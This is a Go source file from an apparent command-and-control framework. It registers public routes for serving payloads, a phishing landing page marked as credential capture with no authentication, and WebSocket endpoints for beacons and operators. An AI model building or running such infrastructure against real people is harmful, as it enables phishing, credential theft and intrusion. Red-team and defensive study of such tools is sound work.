package server

import (
	"time"

	"github.com/forgec2/forgec2/internal/server/middleware"
)

func (s *Server) registerPublicRoutes() {
	s.router.GET("/login", s.handleLoginPage)
	s.router.POST("/login", middleware.RequestBodyLimit(MaxJSONBodySize), s.handleLogin)
	s.router.POST("/api/login", middleware.RequestBodyLimit(MaxJSONBodySize), s.handleLogin)
	healthRateLimiter := middleware.NewRateLimiter(s.ctx, 30, time.Minute)
	s.router.GET("/health", healthRateLimiter.Limit(), s.handleHealthCheck)
	s.router.GET("/ready", healthRateLimiter.Limit(), s.handleReadyCheck)
	s.router.GET("/lang/set", s.handleSetLanguage)
	langRateLimiter := middleware.NewRateLimiter(s.ctx, 10, time.Minute)
	s.router.POST("/lang/set", middleware.RequestBodyLimit(MaxJSONBodySize), langRateLimiter.Limit(), s.handleSetLanguage)
	s.router.GET("/payloads/:id/:filename", s.handleServePayload)
	// Public phishing landing (credential capture) — no auth by design
	s.router.GET("/phishing/l/:token", s.handlePhishingLanding)
	s.router.POST("/phishing/l/:token", middleware.RequestBodyLimit(MaxJSONBodySize), s.handlePhishingLanding)
	s.router.GET("/phishing/oauth/callback", s.handleOAuthCallback)

	// WebSocket endpoints: auth handled inside the handler (via cookie/query token)
	// to avoid redirect loops and support cookie-less connections.
	wsRateLimiter := middleware.NewRateLimiter(s.ctx, 10, time.Minute)
	s.router.GET("/ws", wsRateLimiter.Limit(), s.handleWebSocket)
	s.router.GET("/ws/beacon", wsRateLimiter.Limit(), s.handleWebSocketBeacon)
	s.router.GET("/extc2/ws", wsRateLimiter.Limit(), s.handleExternalC2WebSocket)
	s.router.GET("/ws/operator", wsRateLimiter.Limit(), s.handleOperatorWS)

}

// registerAgentRoutes registers dashboard and agent CRUD routes.
